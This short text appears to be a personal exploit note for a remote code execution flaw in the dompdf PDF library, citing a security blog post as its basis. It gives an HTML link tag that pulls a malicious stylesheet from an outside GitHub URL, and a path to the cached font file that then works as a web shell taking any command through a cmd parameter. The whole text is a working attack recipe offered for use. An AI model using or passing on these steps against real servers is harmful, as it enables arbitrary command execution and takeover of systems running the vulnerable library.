inject this html tag to the pdf generator and it will access the exploit font that will then get caches and we can access it from the webserver


<link rel=stylesheet href="https://raw.githubusercontent.com/sneaky-wizard/dompdf_rce/main/exploit.css" />

to access the cached font and execute any command you want

[baseurl]/dompdf/lib/fonts/exploitfont_normal_474308190ce1ee929b1eede40de56ec7.php?cmd=[command]



based on https://positive.security/blog/dompdf-rce
